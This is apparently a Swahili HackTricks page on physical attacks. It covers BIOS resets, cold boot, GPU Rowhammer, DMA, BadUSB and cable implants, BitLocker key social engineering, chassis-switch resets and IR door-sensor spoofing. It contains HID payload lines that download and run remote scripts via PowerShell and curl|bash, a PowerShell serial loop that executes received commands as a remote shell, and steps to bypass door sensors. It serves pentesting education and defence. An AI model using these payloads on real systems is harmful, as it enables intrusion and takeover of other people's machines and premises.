# Mashambulizi ya Kimwili

{{#include ../banners/hacktricks-training.md}}

## Urejeshaji wa Nenosiri la BIOS na Usalama wa Mfumo

Mipangilio ya firmware ya PC za zamani inaweza kuwekwa upya kwa kukata betri ya CMOS au kutumia jumper ya clear-CMOS iliyoandikwa kwenye nyaraka. Muda unaohitajika wa kuzima umeme hutegemea ubao; nenosiri au funguo za UEFI za kisasa zinaweza kuhifadhiwa kwenye flash isiyofutika, embedded controller, au kifaa cha usalama, na hivyo kubaki baada ya betri kuondolewa. Angalia mwongozo wa ubao/huduma kabla ya kuunganisha pini kwa kifupi; utaratibu huu pia unaweza kubatilisha vipimo vya TPM na kuanzisha urejeshaji wa usimbaji wa diski.

Kwenye mifumo ya zamani ya x86, zana kama **killCMOS** na **CmosPwd** zinaweza kukagua au kubadilisha mipangilio inayohifadhiwa kwenye CMOS kutoka kwenye mazingira ya kuwasha. CmosPwd hutambua miundo ya nenosiri kutoka kwenye orodha iliyoandikwa ya familia za BIOS za zamani, na inaweza kuhifadhi nakala, kurejesha au kufuta/kuua hali ya CMOS; matoleo yake yaliyochapishwa yanalenga mazingira ya zamani ya DOS/Windows, Linux, FreeBSD na NetBSD.<sup>[[18]](#references)</sup> Zana hizi si viondoaji vya jumla vya nenosiri la UEFI na zinahitaji ufikiaji wa kutosha wa hardware/firmware.

Baadhi ya firmware za kompyuta mpakato huonyesha msimbo wa changamoto maalum wa mtengenezaji baada ya majaribio kadhaa ya nenosiri yaliyoshindwa. Hifadhidata kama [bios-pw.org](https://bios-pw.org) zinaweza kukokotoa nenosiri la urejeshaji la mtengenezaji kwa baadhi ya modeli za zamani, lakini mifumo mingi hufunga akaunti bila changamoto inayoweza kukokolewa. Ichukulie nenosiri lolote linalozalishwa kuwa maalum kwa modeli, na epuka kufikisha kikomo cha kudumu cha majaribio.

### Usalama wa UEFI

Kwa mifumo ya kisasa ya **UEFI**, CHIPSEC inaweza kukagua ulinzi wa vigezo vya Secure Boot. Anza na ukaguzi usiobadilisha chochote ulio hapa chini; hali ya hiari ya `-a modify` hujaribu kwa makusudi kuharibu vigezo na inapaswa kutumiwa tu kwenye mfumo wa maabara unaoweza kurejeshwa. CHIPSEC yenyewe inaonya kuwa driver yake yenye ruhusa za juu na ufikiaji wa hardware wa kiwango cha chini havifai kwa vifaa vya mwisho vya uzalishaji.<sup>[[11]](#references)</sup>

```bash
chipsec_main -m common.secureboot.variables
# Destructive validation on a recoverable test system only:
chipsec_main -m common.secureboot.variables -a modify
```

---

## Uchambuzi wa RAM na Mashambulizi ya Cold Boot

DRAM haipotezi kila biti mara moja baada ya refresh kusimama. Kiwango cha kuharibika kwa data hutofautiana sana kulingana na teknolojia ya moduli na halijoto; kupoza kunaweza kuhifadhi data muhimu kwa muda mrefu zaidi kuliko kukata na kurejesha umeme bila kupoza. Cold-boot attack huwasha upya mfumo haraka hadi kwenye mazingira madogo ya ukusanyaji data, au huhamisha moduli iliyopozwa, hunasa data ghafi ya kumbukumbu na kurejesha funguo za kriptografia licha ya kuharibika kwa baadhi ya biti. Zana ya kunakili diski si lazima iwe zana ya kunasa kumbukumbu halisi, na Volatility huchanganua data iliyonaswa badala ya kuinasa; tumia zana ya kunasa data inayofaa na iliyothibitishwa kwa jukwaa husika.<sup>[[12]](#references)</sup>

---

## GPU Rowhammer dhidi ya Majedwali ya Kurasa

Mashambulizi ya kisasa ya GPU Rowhammer huwa na manufaa zaidi yanapolenga **metadata ya kumbukumbu pepe ya GPU** badala ya buffer za kawaida. Utafiti wa hivi karibuni kuhusu **GDDR6 NVIDIA Ampere GPUs** unaonyesha kuwa mshambuliaji anayeendesha msimbo wa CUDA bila haki za juu anaweza kuunda mifumo ya hammering maalum kwa GPU, kutumia **memory massaging** kuweka miundo ya paging kwenye safu zilizo hatarini, kisha kubadilisha biti katika **jedwali la kurasa la kiwango cha mwisho** au **saraka ya kurasa** ya kati. Mara tu ingizo moja la tafsiri linapoharibika, mshambuliaji anaweza kuanzisha **usomaji/uandikaji holela wa kumbukumbu ya GPU** na kisha kuhamia kwenye uathiriwaji wa host.<sup>[[1]](#references)[[2]](#references)</sup>

### Muundo wa Unyonyaji

1. **Tambua safu zinazoweza kuathiriwa na hammering** katika GDDR6 na uunde mifumo ya hammering inayozingatia refresh/isiyo sawia inayopita ulinzi wa ndani ya DRAM.
2. **Panga upya ugawaji wa GPU** ili driver iweke miundo ya tafsiri ya kurasa kwenye maeneo halisi yanayoweza kuathiriwa na hammering badala ya kuiweka katika pool chaguomsingi iliyolindwa. Kwa vitendo, hii inaweza kumaanisha kuishiwa kwa eneo la kumbukumbu ya chini la jedwali la kurasa na kusambaza ramani kubwa za UVM zilizo sparse kwa strides zinazodhibitiwa.
3. **Badilisha metadata ya tafsiri** kama vile biti za **PFN** au zinazohusiana na aperture ndani ya ingizo la jedwali la kurasa/saraka ya kurasa ili ukurasa pepe unaodhibitiwa na mshambuliaji uelekezwe kwenye kurasa za jedwali la kurasa, kumbukumbu holela ya GPU, au ramani za mfumo zinazoonekana kwa host.
4. Tumia tena ramani iliyoghushiwa kuandika upya maingizo mengine ya tafsiri na kupanua ufikiaji hadi **usomaji/uandikaji holela wa kumbukumbu ya GPU** katika miktadha mbalimbali ya GPU.

### Kuhamia kwenye Host na Hatua za Kupunguza Hatari

- **IOMMU ikiwa imezimwa**, ramani za aperture ya mfumo zilizoghushiwa zinaweza kuipa GPU ufikiaji wa **kumbukumbu halisi holela ya host**, na kugeuza uwezo wa GPU kuwa uathiriwaji kamili wa host.<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>
- **GDDRHammer** hulenga maingizo ya jedwali la kurasa la kiwango cha mwisho, ilhali **GeForge** inaonyesha kuwa kuharibu kiwango cha saraka ya kurasa kunaweza kuwa rahisi zaidi kwa sababu kubadilisha biti moja kunaweza kuelekeza upya tawi kubwa zaidi la tafsiri. Usichukulie kiwango kimoja tu cha paging kuwa muhimu kwa usalama.<sup>[[1]](#references)[[2]](#references)</sup>
- **IOMMU** bado ni muhimu kwa sababu huzuia njia ya moja kwa moja ya kufikia kumbukumbu holela ya host inayotumiwa na GDDRHammer/GeForge, lakini **si hatua kamili ya kupunguza hatari**. **GPUBreach** inaonyesha hatua ya pili ya kuhamia kwenye host ambapo mshambuliaji huharibu buffer za CPU zinazoweza kuandikwa na GPU na zinazomilikiwa na driver, kisha husababisha hitilafu za usalama wa kumbukumbu za NVIDIA driver ili kupata uwezo wa kuandika kwenye kernel na **root shell**, hata IOMMU ikiwa imewashwa.<sup>[[3]](#references)</sup>
- **ECC ya kiwango cha mfumo** ni hatua ya vitendo ya kuimarisha usalama kwenye GPU zinazoungwa mkono za workstation/server. GPU za watumiaji zisizo na ECC huwa na ulinzi dhaifu zaidi.<sup>[[4]](#references)</sup>
- Mashambulizi haya si ya kinadharia tu: **GeForge** iliripoti mabadiliko ya biti **1,171** kwenye RTX 3060 na **202** kwenye RTX A6000, ambayo yalitosha kuunda mfululizo wa hatua unaofanya kazi wa kupandisha haki za host.<sup>[[2]](#references)[[9]](#references)</sup>

---

## Mashambulizi ya Direct Memory Access (DMA)

Kwa urekebishaji wa offline wa UEFI IFR/NVRAM unaoweza kupunguza utekelezaji wa IOMMU kabla ya kuwasha mfumo na kuwezesha mfululizo wa mashambulizi ya DMA ya Windows, tazama:

{{#ref}}
firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

**Inception** inaonyesha **ukusanyaji na urekebishaji wa kumbukumbu kwa kutumia DMA** kupitia violesura kama FireWire na usanidi wa awali wa Thunderbolt, ikijumuisha saini za kihistoria za kuruka kuingia. Si sahihi kusema tu kwamba “haifanyi kazi dhidi ya Windows 10”: uwezekano wa unyonyaji hutegemea kiolesura, build lengwa, sera ya IOMMU, hali ya kufuli, na kama Windows Kernel DMA Protection inaungwa mkono na imewashwa. Windows 10 version 1803 na matoleo ya baadaye yalianzisha Kernel DMA Protection kwenye majukwaa yanayooana, na hivyo kubadilisha kwa kiasi kikubwa eneo la mashambulizi.<sup>[[13]](#references)[[14]](#references)</sup>

---

## Live CD/USB kwa Ufikiaji wa Mfumo

Kwenye volume ya Windows ambayo haijasimbwa au ambayo tayari imefunguliwa, mazingira ya offline yanaweza kubadilisha binary za ufikivu kama **sethc.exe** au **Utilman.exe** na kuweka **cmd.exe**, na hivyo kutoa kidokezo cha amri cha SYSTEM wakati njia ya mkato inayolingana kwenye skrini ya kuingia inapotumiwa. Zana kama **chntpw** zinaweza kuhariri data ya akaunti za ndani ya SAM. Mbinu hizi haziwezi kupita volume ya BitLocker iliyofungwa na zinaweza kuharibu vitambulisho vinavyolindwa na DPAPI/EFS; hifadhi nakala za kiuchunguzi na za kuhifadhi.

**Kon-Boot** ni zana ya kibiashara ya kupita uthibitishaji wakati wa kuwasha mfumo kwa usanidi unaoungwa mkono wa Windows/macOS. Uoanifu hutegemea OS, hali ya firmware, Secure Boot na usanidi wa usimbaji wa diski; haiwezi kusimbua volume ya BitLocker iliyofungwa.<sup>[[10]](#references)</sup>

---

## Kushughulikia Vipengele vya Usalama vya Windows

### Njia za Mkato za Kuwasha na Urejeshaji

- **Delete/Supr**, F2, F10, au kitufe kingine cha mtengenezaji kinaweza kufungua usanidi wa firmware.
- **F8** hufungua chaguo za zamani za kuwasha za Windows za hali ya juu tu kwenye usanidi ambapo njia hiyo bado imewashwa; njia ya sasa ya kuingia kwenye urejeshaji hutofautiana.
- Kushikilia **Shift** kunaweza kuzuia kuingia kiotomatiki kwa Windows katika baadhi ya usanidi, ingawa mipangilio ya sera/registry inaweza kuzima tabia hiyo.<sup>[[17]](#references)</sup>

### Vifaa vya BAD USB

Vifaa kama **USB Rubber Ducky** na bodi za Teensy vinaweza kujitambulisha kama kibodi za HID zinazoaminika na kuingiza mibonyezo ya vitufe iliyopangwa mapema. Mwanzoni, payload huwa na haki na ufikiaji wa desktop wa kipindi cha mtumiaji aliyeingia; vidokezo vya UAC, kufunga skrini, mpangilio wa kibodi, muda wa utekelezaji na sera ya USB ya endpoint bado huiwekea vikwazo.<sup>[[15]](#references)</sup>

### Volume Shadow Copy

Haki za msimamizi au za chelezo zinaweza kutumika kuunda shadow copy au kuhifadhi hive za registry ili kupata faili zilizofungwa kama **SAM** na **SYSTEM**. Hii ni mbinu ya ukusanyaji data baada ya kuathiri mfumo, si njia ya kupita vikwazo vya haki, na inapaswa kulinganishwa na matukio ya `diskshadow`/VSS na uhamishaji wa hive za registry.

## Mbinu za BadUSB / HID Implant

### Kifaa cha Android HID kinachoanzishwa na NFC

Simu ya Android iliyofanyiwa root inaweza kuwa kibodi ya USB inayopangwa tu ikiwa kidhibiti chake cha USB na kernel vina **USB gadget/HID support**. Kwenye vifaa vinavyooana, Kali NetHunter hutoa wasifu wa gadget kupitia **USB Arsenal**. Chaguo jingine ni [USB Gadget Tool](https://github.com/tejado/android-usb-gadget), ambayo huunda kazi za ConfigFS gadget na inaweza kutoa vifaa vya herufi vya kibodi/panya kama `/dev/hidg0` na `/dev/hidg1`. Zana hii huunda tu endpoint ya gadget; mchakato tofauti lazima uandike ripoti za HID humo. Ufikiaji wa root hauwezi kufidia kernel isiyo na ConfigFS, HID gadget support, au USB Device Controller inayoweza kutumika.<sup>[[19]](#references)[[20]](#references)[[21]](#references)</sup>

Endpoint hii inaweza kuunganishwa na NFC ya Android ili kutumika kama kichocheo halisi. Programu ya [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID) husoma UID ya tagi, huibadilisha kuwa uwakilishi unaotarajiwa, hukagua whitelist ya ndani, na hutuma mfuatano wa mibonyezo ya kibodi wa aina ya Rubber Ducky uliosanidiwa baada ya kupata ulinganifu. Host iliyounganishwa huona ingizo la kawaida la kibodi na haihitaji programu ya NFC.<sup>[[22]](#references)[[24]](#references)</sup>

Thibitisha kujitambulisha kwa kifaa na mpangilio wa kibodi kwenye kihariri tupu cha maandishi kabla ya kutumia njia za mkato au amri. Payload isiyo na madhara ni:<sup>[[24]](#references)</sup>

```text
DELAY 1000
STRING NFC HID test successful
ENTER
```

Mipaka muhimu ya uaminifu:<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>

- **Orodha ya UID zinazoruhusiwa ni ya utambuzi, si uthibitishaji**. UID ni za umma, na baadhi ya aina za tokeni au emulators huruhusu kunakili au kujifanya tokeni nyingine. UID iliyoruhusiwa iliyonakiliwa hufuata njia ileile ya uchakataji kama tokeni ya awali.
- Module ya **NfcScreenOff** ya Magisk hubadilisha huduma ya NFC ili ifanye kazi kana kwamba skrini imewashwa na kufunguliwa. Ikiwa simu tayari imeunganishwa na kifaa mwenyeji, hili linaweza kumruhusu mtu kuanzisha payload bila kufungua simu.
- Nywila, tokeni za API, na amri zilizohifadhiwa kwenye payload ni siri zinazoweza kurejeshwa kwenye kifaa chenye root au kilichofunguliwa bootloader. Kuandika nywila kupitia HID ni uwekaji otomatiki wa kutumia tena nywila, si uthibitishaji usiotumia nywila.
- Uingizaji wa HID hutumia ruhusa za desktop inayotumika na hutegemea sehemu iliyo na focus, muda na mpangilio wa kibodi wa kifaa mwenyeji. Hitaji uthibitisho wa hivi karibuni wa mtumiaji kabla ya kutekeleza vitendo nyeti, epuka kuweka siri za ruhusa za juu kwenye script, na tumia kithibitishaji cha cryptographic cha challenge-response kwa uthibitishaji halisi.

### Vipandikizi vya kebo vinavyodhibitiwa kupitia Wi-Fi

- Vipandikizi vinavyotegemea ESP32-S3 kama **Evil Crow Cable Wind** hujificha ndani ya kebo za USB-A→USB-C au USB-C↔USB-C, hujitambulisha kama kibodi ya USB pekee, na hufichua stack yake ya C2 kupitia Wi-Fi. Mwendeshaji anahitaji tu kuwasha kebo kwa kuiunganisha kwenye kifaa mwenyeji cha mwathiriwa, kuunda hotspot yenye jina `Evil Crow Cable Wind` na nenosiri `123456789`, kisha kufungua [http://cable-wind.local/](http://cable-wind.local/) (au anwani yake ya DHCP) ili kufikia kiolesura cha HTTP kilichopachikwa.<sup>[[8]](#references)</sup>
- Kiolesura cha kivinjari kina vichupo vya *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, na *Config*. Payload zilizohifadhiwa huwekewa lebo kulingana na OS, mipangilio ya kibodi hubadilishwa papo hapo, na mifuatano ya VID/PID inaweza kubadilishwa ili kuiga vifaa vya pembeni vinavyojulikana.
- Kwa kuwa C2 iko ndani ya kebo, simu inaweza kuweka payload, kuanzisha utekelezaji na kusimamia vitambulisho vya Wi-Fi bila kutumia mtandao wa shirika—jambo linalofaa kwa uvamizi wa kimwili wa muda mfupi.

### Payload za AutoExec zinazotambua OS

- Sheria za AutoExec huunganisha payload moja au zaidi ili zitekelezwe mara tu baada ya USB kujitambulisha. Kipandikizi hufanya utambuzi mwepesi wa OS na kuchagua script inayolingana.
- Mfano wa mtiririko wa kazi:
  - *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
  - *macOS/Linux:* `COMMAND SPACE` (Spotlight) au `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Kwa kuwa utekelezaji hufanyika bila uangalizi, kubadilisha tu kebo ya kuchaji kunaweza kutoa ufikiaji wa awali wa “plug-and-pwn” chini ya muktadha wa mtumiaji aliyeingia.

### Remote shell inayoanzishwa na HID kupitia Wi-Fi TCP

1. **Kuanzisha kwa mibofyo ya vitufe:** Payload iliyohifadhiwa hufungua console na kubandika loop inayotekeleza chochote kinachofika kupitia kifaa kipya cha USB serial. Toleo dogo la Windows ni:

```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```

2. **Cable bridge:** Implant huweka channel ya USB CDC wazi huku ESP32-S3 yake ikianzisha TCP client (Python script, Android APK, au desktop executable) kuelekea kwa operator. Byte zozote zinazoandikwa kwenye TCP session hutumwa kwenye serial loop iliyo hapo juu, na hivyo kuwezesha remote command execution hata kwenye hosts zilizotengwa na mtandao. Output ni chache, kwa hiyo operators kwa kawaida huendesha commands bila kuona matokeo (kuunda akaunti, kuweka tooling ya ziada tayari, n.k.).

### Sehemu ya HTTP OTA update

- Interface ya Evil Crow Cable Wind iliyoandikwa kwenye nyaraka ina endpoint ya firmware update isiyohitaji uthibitishaji kwenye `/update`:<sup>[[8]](#references)</sup>

```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```

- Waendeshaji wa uwanjani wanaweza kubadilisha vipengele kwa hot-swap (k.m., kuwasha firmware ya USB Army Knife) katikati ya operesheni bila kufungua kebo, hivyo kuruhusu implant kubadili na kutumia uwezo mpya huku ikiwa bado imeunganishwa kwenye host lengwa.

## Kukwepa Usimbaji Fiche wa BitLocker

Upatikanaji wa kiuchunguzi ulioidhinishwa wa mfumo ulio hai au uliokuwa ukiendeshwa hivi karibuni unaweza kuwa na ufunguo mkuu wa volume ya BitLocker au nyenzo nyingine zinazohusiana na ufunguo, wakati volume ikiwa imefunguliwa. Zana za kibiashara kama Elcomsoft Forensic Disk Decryptor na Passware Kit Forensic zinaweza kutafuta katika picha za kumbukumbu, faili za hibernation au crash dumps zinazotumika, lakini mafanikio hayajahakikishwa. Windows za kisasa pia husimba crash dumps kwa njia fiche wakati BitLocker imewashwa, na nenosiri la urejeshaji lenye tarakimu 48 lililohifadhiwa ni aina tofauti ya data na ufunguo wa volume ulio kwenye kumbukumbu.<sup>[[12]](#references)[[16]](#references)</sup>

---

## Uhandisi wa Kijamii wa Kuongeza Ufunguo wa Urejeshaji

Mshambuliaji anayemshawishi msimamizi kutekeleza amri za usimamizi wa BitLocker anaweza kuongeza recovery-password, external-key au protector nyingine, kisha kuinasa. Nenosiri la urejeshaji haliwezi kuwa mfuatano wowote wa sufuri: nenosiri la urejeshaji la nambari la BitLocker lazima liwe na umbizo lililothibitishwa la tarakimu 48. Sintaksia husika ya usimamizi ulioidhinishwa ni `manage-bde -protectors -add C: -recoverypassword`; orodhesha protectors zilizoongezwa kwa `manage-bde -protectors -get C:`. Fuatilia uongezaji wa protectors na uhakikishe kuwa nyenzo mpya za urejeshaji zinawekwa kwenye hifadhi salama katika maeneo yaliyoidhinishwa pekee.<sup>[[16]](#references)</sup>

---

## Kutumia Swichi za Kuingiliwa kwa Chassis / Matengenezo Kuweka BIOS Upya kwenye Hali ya Kiwandani

Kompyuta mpakato nyingi za kisasa na kompyuta za mezani za umbo dogo zina **swichi ya kuingiliwa kwa chassis** inayofuatiliwa na Embedded Controller (EC) na firmware ya BIOS/UEFI. Ingawa kusudi kuu la swichi hiyo ni kutoa tahadhari kifaa kinapofunguliwa, wakati mwingine watengenezaji hutekeleza **njia ya mkato ya urejeshaji isiyoandikwa kwenye nyaraka**, ambayo huanzishwa swichi inapobadilishwa kwa mfuatano maalum.<sup>[[5]](#references)[[6]](#references)</sup>

### Jinsi Shambulio Linavyofanya Kazi

1. Swichi imeunganishwa kwenye **GPIO interrupt** ya EC.
2. Firmware inayotekelezwa kwenye EC hufuatilia **muda na idadi ya mibofyo**.
3. Mfuatano uliowekwa moja kwa moja kwenye msimbo unapotambuliwa, EC huanzisha utaratibu wa *mainboard-reset* unaofuta **yaliyomo kwenye NVRAM/CMOS ya mfumo**.
4. Mfumo unapowashwa tena, modeli zilizoathiriwa hupakia hali ya firmware iliyowekwa upya. Kulingana na mtengenezaji na toleo, hali iliyofutwa inaweza kujumuisha nenosiri la msimamizi, mipangilio maalum ya kuwasha mfumo, au funguo za Secure Boot zilizosajiliwa; hali ya TPM na athari kwa usimbaji fiche wa diski lazima zitathminiwe kando.

> Kuweka firmware upya kunaweza kurejesha chaguo za kuwasha kutoka kwenye vifaa vya nje, lakini **hakusimbui hifadhi fiche**. BitLocker au mfumo mwingine wa usimbaji fiche wa diski nzima unaweza kuingia katika hali ya urejeshaji baada ya mabadiliko ya TPM/firmware na bado kuilinda diski ya ndani bila ufunguo wa urejeshaji.<sup>[[16]](#references)</sup>

### Mfano Halisi – Kompyuta Mpakato ya Framework 13

Njia ya mkato ya urejeshaji ya Framework 13 (kizazi cha 11/12/13) ni:

```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```

Baada ya mzunguko wa kumi, EC huweka flag inayoelekeza BIOS kufuta NVRAM wakati wa kuwasha upya kunakofuata. Utaratibu mzima huchukua takriban sekunde 40 na hauhitaji **chochote isipokuwa bisibisi**.<sup>[[5]](#references)</sup>

### Utaratibu wa Jumla wa Exploitation

1. Washa kifaa lengwa au kifanye suspend kisha ukiamshe tena ili EC iwe inafanya kazi.
2. Ondoa kifuniko cha chini ili kufichua swichi ya intrusion/maintenance.
3. Rudia mfuatano wa kuwasha/kuzima uliobainishwa na mtengenezaji (angalia nyaraka au vikao, au fanya reverse-engineer ya firmware ya EC).
4. Kusanya kifaa tena na ukiwashe upya, kisha kagua ni mipangilio gani ya firmware na credentials zilizobadilika.
5. Ikiwa una idhini na uwezekano wa kuwasha kutoka kifaa cha nje unapatikana, washa live image inayodhibitiwa. Mara tu volume ya ndani inapofunguliwa kihalali (au ikiwa haikuwa imesimbwa kwa njia fiche), mazingira ya live yanaweza kupata credentials na data au kukagua EFI System Partition. Kurekebisha partition hiyo ili kusakinisha EFI implant ni jambo linalodumu na linaingilia sana mfumo, na bado huzuiwa na Secure Boot, measured boot, ulinzi wa kuandika wa firmware na ufuatiliaji wa endpoint. Hifadhi iliyosimbwa kwa njia fiche bado haiwezi kufikiwa bila ufunguo wake au taarifa za kurejesha.

### Ugunduzi na Upunguzaji wa Hatari

* Rekodi matukio ya chassis-intrusion katika dashibodi ya usimamizi wa OS na uyahusishe na BIOS resets zisizotarajiwa.
* Tumia **mihuri inayoonyesha dalili za kuchezewa** kwenye skrubu/vifuniko ili kugundua kufunguliwa.
* Hifadhi vifaa katika **maeneo yanayodhibitiwa kimwili**; chukulia kuwa ufikiaji wa kimwili unamaanisha mfumo umeingiliwa kikamilifu.
* Ikiwa inapatikana, zima kipengele cha mtengenezaji cha “maintenance switch reset” au hitaji idhini ya ziada ya kriptografia ili kuweka upya NVRAM.

---

## Uingizaji wa IR kwa Siri Dhidi ya Sensor za Kutoka Bila Kugusa

### Sifa za Sensor
- Sensor za kawaida za “wave-to-exit” huunganisha IR LED emitter ya karibu na receiver module ya aina ya rimoti ya TV, ambayo huripoti logic high tu baada ya kupokea mapigo kadhaa (~4–10) ya carrier sahihi (≈30 kHz).<sup>[[7]](#references)</sup>
- Kifuniko cha plastiki huzuia emitter na receiver kuelekeana moja kwa moja, kwa hiyo controller hudhani kwamba carrier yoyote iliyothibitishwa imetokana na mwanga ulioakisiwa karibu na sensor, kisha huwasha relay inayofungua strike ya mlango.
- Mara tu controller inapoamini kuwa kuna kitu lengwa, mara nyingi hubadilisha outbound modulation envelope, lakini receiver huendelea kukubali burst yoyote inayolingana na carrier iliyochujwa.

### Mchakato wa Shambulio
1. **Nasa muundo wa mawimbi yanayotumwa** – unganisha logic analyser kwenye pini za controller ili kurekodi mawimbi ya kabla na baada ya kugunduliwa yanayoendesha IR LED ya ndani.
2. **Rudia waveform ya “baada ya kugunduliwa” pekee** – ondoa/tupu emitter ya kawaida na uendeshe IR LED ya nje kwa kutumia muundo ambao tayari umewashwa tangu mwanzo. Kwa kuwa receiver hujali tu idadi/marudio ya mapigo, huchukulia carrier iliyoghushiwa kuwa mwanga ulioakisiwa kihalisi na kuwasha laini ya relay.
3. **Dhibiti muda wa utumaji** – tuma carrier kwa burst zilizorekebishwa (kwa mfano, makumi ya milliseconds ikiwa imewashwa, kisha muda unaokaribiana ikiwa imezimwa) ili kutuma idadi ya chini kabisa ya mapigo bila kuzidisha AGC ya receiver au mantiki yake ya kushughulikia interference. Utumaji endelevu hupunguza haraka unyeti wa sensor na kuzuia relay kuwashwa.

### Uingizaji wa Mwanga Ulioakisiwa wa Masafa Marefu
- Kubadilisha LED ya majaribio na IR diode yenye nguvu kubwa, MOSFET driver na optics za kulenga huwezesha kuwasha sensor kwa uhakika kutoka umbali wa takriban mita 6.
- Mshambuliaji hahitaji line-of-sight kuelekea tundu la receiver; kulenga boriti kwenye kuta za ndani, rafu au fremu za mlango zinazoonekana kupitia kioo huruhusu mwanga ulioakisiwa kuingia kwenye field of view ya takriban 30° na kuiga kupunga mkono karibu na sensor.
- Kwa kuwa receivers hutegemea mwanga hafifu ulioakisiwa tu, boriti ya nje yenye nguvu zaidi inaweza kuakisiwa kwenye nyuso nyingi na bado kuzidi kiwango cha chini cha utambuzi.

### Tochi ya Shambulio Iliyobadilishwa kwa Makusudi
- Kuficha driver ndani ya tochi ya kawaida ya kibiashara huifanya zana hiyo isionekane ya kutiliwa shaka. Badilisha LED inayoonekana na IR LED yenye nguvu kubwa inayolingana na bendi ya receiver, ongeza ATtiny412 (au kifaa kama hicho) ili kutengeneza burst za ≈30 kHz, na utumie MOSFET kudhibiti mkondo wa LED.
- Lenzi ya zoom inayotanuka hukaza boriti ili kuongeza masafa/usahihi, huku vibration motor inayodhibitiwa na MCU ikitoa uthibitisho wa mguso kwamba modulation inafanya kazi bila kutoa mwanga unaoonekana.
- Kubadilisha kati ya mifumo kadhaa ya modulation iliyohifadhiwa (carrier frequencies na envelopes zinazotofautiana kidogo) huongeza ulinganifu na familia za sensor zilizouzwa upya chini ya chapa tofauti. Hii humwezesha mwendeshaji kujaribu nyuso zinazoakisi hadi relay isikike ikibofya na mlango kufunguka.

---

## References

- [1] [GDDRHammer: Kusumbua Sana Safu za DRAM — Mashambulizi ya Rowhammer Kati ya Vipengele Tofauti kutoka kwa GPU za Kisasa](https://gddr.fail/files/gddrhammer.pdf)
- [2] [GeForge: Kupiga Nyundo kwenye Kumbukumbu ya GDDR ili Kutengeneza Jedwali za Kurasa za GPU kwa Burudani na Faida](https://stefan1wan.github.io/files/GeForge.pdf)
- [3] [GPUBreach: Mashambulizi ya Kuongeza Haki kwenye GPU kwa Kutumia Rowhammer](https://gururaj-s.github.io/assets/pdf/SP26_GPUBreach.pdf)
- [4] [NVIDIA - Taarifa ya Usalama: Rowhammer - Julai 2025](https://nvidia.custhelp.com/app/answers/detail/a_id/5671/~/security-notice%3A-rowhammer---july-2025)
- [5] [Pentest Partners – “Framework 13. Bonyeza hapa ili ku-own”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [6] [FrameWiki – Mwongozo wa Kuweka Upya Mainboard](https://framewiki.net/guides/mainboard-reset)
- [7] [SensePost – “Usiguse! – Kukwepa Sensor za Kutoka za IR Bila Kugusa kwa Kutumia Tochi ya IR ya Siri”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [8] [Mobile-Hacker – “Chomeka, Washa, Pwn: Hacking kwa Kutumia Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)
- [9] [Bruce Schneier - Shambulio la Rowhammer Dhidi ya Chips za NVIDIA](https://www.schneier.com/blog/archives/2026/05/rowhammer-attack-against-nvidia-chips.html)
- [10] [Nyaraka rasmi za Kon-Boot na taarifa za ulinganifu](https://kon-boot.com/)
- [11] [Nyaraka za CHIPSEC - Ulinzi wa vigezo vya Secure Boot](https://chipsec.github.io/modules/chipsec.modules.common.secureboot.variables.html)
- [12] [Tusisahau: Mashambulizi ya Cold Boot dhidi ya Funguo za Usimbaji Fiche](https://www.usenix.org/legacy/events/sec08/tech/full_papers/halderman/halderman.pdf)
- [13] [Inception - Udanganyifu wa kumbukumbu halisi kupitia DMA](https://github.com/carmaa/inception)
- [14] [Microsoft Learn - Ulinzi wa Kernel DMA](https://learn.microsoft.com/en-us/windows/security/hardware-security/kernel-dma-protection-for-thunderbolt)
- [15] [Nyaraka za Hak5 USB Rubber Ducky](https://docs.hak5.org/hak5-usb-rubber-ducky/)
- [16] [Microsoft Learn - Mwongozo wa utendaji wa BitLocker](https://learn.microsoft.com/en-us/windows/security/operating-system-security/data-protection/bitlocker/operations-guide)
- [17] [Microsoft Learn - Kushikilia Shift na tabia ya kuingia kiotomatiki](https://learn.microsoft.com/en-us/troubleshoot/windows-client/user-profiles-and-logon/hold-shift-key-shutting-down-not-disable-automatic-logon)
- [18] [CGSecurity - Nyaraka na vipakuliwa vya CmosPwd](https://www.cgsecurity.org/wiki/CmosPwd)
- [19] [Nyaraka za Kali Linux - NetHunter USB-Arsenal](https://www.kali.org/docs/nethunter/nethunter-usbarsenal/)
- [20] [Nyaraka za Linux kernel - Kiendeshi cha USB HID gadget](https://docs.kernel.org/usb/gadget_hid.html)
- [21] [USB Gadget Tool](https://github.com/tejado/android-usb-gadget)
- [22] [NFC-to-HID](https://github.com/androidmalware/NFC-to-HID)
- [23] [NfcScreenOff](https://github.com/Jon8RFC/NfcScreenOff)
- [24] [Badilisha Simu ya Android Iliyopatiwa Root Kuwa Kithibitishaji cha NFC na Zana ya Uendeshaji Otomatiki kwa Kompyuta Yako](https://mobile-hacker.com/2026/09/21/turn-a-rooted-android-phone-into-an-nfc-authenticator-and-automation-tool-for-your-pc/)
{{#include ../banners/hacktricks-training.md}}
